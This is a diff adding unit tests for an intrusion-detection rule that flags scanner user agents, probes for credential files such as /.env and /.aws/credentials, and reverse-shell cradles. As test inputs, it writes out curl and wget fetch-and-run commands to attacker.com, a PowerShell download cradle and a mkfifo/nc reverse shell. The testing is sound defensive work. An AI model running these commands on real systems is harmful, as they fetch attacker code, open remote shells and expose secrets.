@@ -177,6 +177,51 @@ class TestPayloadRule(unittest.TestCase):
         self.assertEqual(hit["signature"], "SQL_INJECTION")
         self.assertEqual(hit["representation"], "comment_normalized")
 
+    def test_scanner_probe_user_agents(self):
+        for ua in (b"sqlmap/1.7#stable", b"Mozilla/5.00 (Nikto/2.1.6)", b"gobuster/3.1.0", b"nuclei"):
+            pkt = self.packet(b"GET /api HTTP/1.1\r\nUser-Agent: " + ua + b"\r\n\r\n", 5000)
+            alert = self.rule.check(pkt)
+            self.assertIsNotNone(alert, f"Expected alert for scanner User-Agent: {ua}")
+            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
+            self.assertIn("SCANNER_PROBE", signatures)
+            self.assertEqual(alert["severity"], "high")
+
+    def test_sensitive_file_probe(self):
+        for path in (b"/.env", b"/.env.local", b"/.git/config", b"/id_rsa", b"/.aws/credentials", b"/wp-config.php"):
+            pkt = self.packet(b"GET " + path + b" HTTP/1.1\r\nHost: example.com\r\n\r\n", 5100)
+            alert = self.rule.check(pkt)
+            self.assertIsNotNone(alert, f"Expected alert for sensitive file probe: {path}")
+            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
+            self.assertIn("SENSITIVE_FILE_PROBE", signatures)
+            self.assertEqual(alert["severity"], "high")
+
+    def test_reverse_shell_cradle(self):
+        cradles = (
+            b"; curl http://attacker.com/sh | sh ;",
+            b"; wget -qO- http://attacker.com/b | bash ;",
+            b"powershell -nop -enc JABzAD0...",
+            b"IEX (New-Object Net.WebClient).DownloadString('http://bad.com/p')",
+            b"mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f",
+        )
+        for cradle in cradles:
+            pkt = self.packet(b"POST /submit HTTP/1.1\r\nContent-Length: 100\r\n\r\ncmd=" + cradle, 5200)
+            alert = self.rule.check(pkt)
+            self.assertIsNotNone(alert, f"Expected alert for reverse shell cradle: {cradle}")
+            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
+            self.assertIn("REVERSE_SHELL_CRADLE", signatures)
+            self.assertEqual(alert["severity"], "high")
+
+    def test_benign_web_traffic_does_not_fire(self):
+        benign_requests = (
+            b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n",
+            b"GET /static/css/app.css HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)\r\n\r\n",
+            b"POST /api/contact HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/7.88.1\r\nContent-Length: 18\r\n\r\nname=Alice&env=prod",
+        )
+        for req in benign_requests:
+            pkt = self.packet(req, 5300)
+            alert = self.rule.check(pkt)
+            self.assertIsNone(alert, f"Unexpected alert on benign request: {req}")
+
 
 if __name__ == "__main__":
     unittest.main()
